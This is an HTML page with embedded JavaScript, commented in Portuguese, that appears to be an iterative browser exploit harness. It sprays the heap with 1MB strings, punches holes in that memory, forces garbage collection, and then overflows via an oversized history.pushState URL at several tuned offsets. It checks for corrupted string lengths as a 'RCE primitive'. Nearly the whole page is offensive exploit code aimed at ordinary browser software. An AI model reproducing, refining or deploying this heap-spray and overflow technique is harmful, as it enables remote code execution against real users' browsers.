<!DOCTYPE html>
<html>
<head>
    <title>1MB Decoder Clash: Fine Tuning 2</title>
    
</head>
<body>

    <h1>1MB Decoder Clash: Sintonia Fina</h1>
    <p>Base mantida 100%. Ajustando apenas o ponto de impacto.</p>

    <div style="display:flex; flex-wrap:wrap;">
        <button onclick="startDecoderAttack(0)">0. REFERÊNCIA (Dados)</button>
        <button onclick="startDecoderAttack(4)">1. Recuar 4 bytes</button>
        <button onclick="startDecoderAttack(8)">2. Recuar 8 bytes</button>
        <button onclick="startDecoderAttack(12)">3. Recuar 12 bytes</button>
        <button onclick="startDecoderAttack(16)">4. Recuar 16 bytes</button>
        <button onclick="startDecoderAttack(24)">5. Recuar 24 bytes</button>
    </div>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // O Offset Original que funcionou (Dados)
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // CONFIGURAÇÃO 100% FIEL AO SUCESSO
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startDecoderAttack(adjustment) {
            // O offset do tiro é ajustado para trás
            let currentOffset = BASE_OFFSET - adjustment;
            
            log(`----------------------------------------`);
            log(`TESTANDO RECUO -${adjustment} (Offset ${currentOffset})...`);
            log(`Criando vítimas de 1MB (Base Fiel)...`);

            // 1. Limpeza Prévia
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY (Cópia exata do sucesso)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 80; 
                
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Abrindo buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i] = null;
                }

                // Força GC pesado
                await forceGC();

                // 4. EXPLOIT COM OFFSET AJUSTADO
                log(`Disparando em ${currentOffset}...`);
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(currentOffset);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "pwn_" + adjustment, "/" + buffer);

                        log("Verificando...");
                        checkVictims(PAYLOAD_SIZE, adjustment);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkVictims(expectedLen, adj) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO ABSOLUTO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com -${adj}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`);
                        alert("RCE PRIMITIVE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // SUCESSO PARCIAL (Dados)
                    if (msg.charCodeAt(0) === 1) { // 1 = 0x01
                        log(`[Sucesso Parcial] DADOS atingidos com -${adj}.`, 'hit');
                        log(`Ainda estamos escrevendo dentro da string. Tente recuar mais.`);
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log(`Nada atingido com -${adj}.`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>


